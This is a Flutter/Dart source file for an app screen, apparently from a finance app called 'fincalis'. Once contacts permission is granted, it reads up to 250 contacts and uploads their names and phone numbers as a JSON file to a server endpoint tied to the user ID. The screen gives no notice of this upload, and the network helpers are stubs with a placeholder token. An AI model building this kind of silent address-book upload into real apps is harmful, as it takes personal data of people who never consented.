import 'dart:convert';
import 'dart:io';
import 'package:contacts_service/contacts_service.dart';
import 'package:fincalis/Services/api_names.dart';
import 'package:fincalis/model/SubmittDataModel.dart';
import 'package:fincalis/utils/Preferances.dart';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';

class ContactListScreen extends StatefulWidget {
  @override
  _ContactListScreenState createState() => _ContactListScreenState();
}

class _ContactListScreenState extends State<ContactListScreen> {
  File? file;
  List<Contact> _contacts = [];

  @override
  void initState() {
    super.initState();
    _requestPermissions();
  }

  Future<void> _requestPermissions() async {
    try {
      if (await Permission.contacts.request().isGranted) {
        _loadContacts();
      } else {
        // Handle permission denied
        print("Permission denied");
      }
    } catch (e) {
      print('Error requesting permissions: $e');
    }
  }

  Future<void> _loadContacts() async {
    Iterable<Contact> contacts = await ContactsService.getContacts();

    // Convert the iterable to a list
    List<Contact> contactList = contacts.toList();

    // Limit the list to a maximum of 250 contacts
    if (contactList.length > 250) {
      contactList = contactList.sublist(0, 250);
    }

    // Update the state with the limited list of contacts
    setState(() {
      _contacts = contactList;
    });

    // Call _saveContactsToJson after loading contacts
    await _saveContactsToJson();
  }


  Future<void> _saveContactsToJson() async {
    List<Map<String, dynamic>> contactsList = _contacts.map((contact) {
      return {
        'displayName': contact.displayName,
        'phones': contact.phones?.map((item) => item.value).toList(),
      };
    }).toList();

    String jsonString = jsonEncode(contactsList);
    print(jsonString);

    final directory = await getApplicationDocumentsDirectory();
    file = File('${directory.path}/contacts.json');
    await file?.writeAsString(jsonString);
    print("Contacts file: ${file}");

    await _uploadContactsFile();
  }

  Future<void> _uploadContactsFile() async {
    var userId = await PreferenceService().getString('user_id');
    if (file != null && userId != null) {
      SubmittDataModel? data = await UserApi.submitContactApi(file!, userId);
      if (data != null && data.success == 1) {
        print("Upload successful");
        print("MyUserId::: ${userId}");
      } else {
        print("Upload failed");
      }
    } else {
      print("File or userId is null");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(

      body: _contacts.isNotEmpty
          ? ListView.builder(
        itemCount: _contacts.length,
        itemBuilder: (context, index) {
          Contact contact = _contacts[index];
          return ListTile(
            title: Text(contact.displayName ?? ''),
            subtitle: Text(contact.phones!.isNotEmpty
                ? contact.phones?.first.value ?? ''
                : 'No phone number'),
            // You can add more details here like emails, addresses, etc.
          );
        },
      )
          : Center(
        child: CircularProgressIndicator(),
      ),
    );
  }
}

class UserApi {
  static Future<SubmittDataModel?> submitContactApi(File file, String userId) async {
    try {
      final headers = await getHeader1();
      final res = await postImage({}, "${host}/user/contact?user_id=$userId", headers, file);
      if (res != null && res.isNotEmpty) {
        print("SubmitContactApi Response: $res");
        final parsedRes = jsonDecode(res);
        return SubmittDataModel.fromJson(parsedRes);
      } else {
        print("Null or empty response");
        return null;
      }
    } catch (e) {
      debugPrint('Error in SubmitContactApi: $e');
      return null;
    }
  }

  static Future<Map<String, String>> getHeader1() async {
    // Implement your method to get headers
    return {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer your_token_here',
    };
  }

  static Future<String?> postImage(Map<String, dynamic> body, String url, Map<String, String> headers, File file) async {
    // Implement your method to post image
    return '{"settings": {"success": 1}}';
  }
}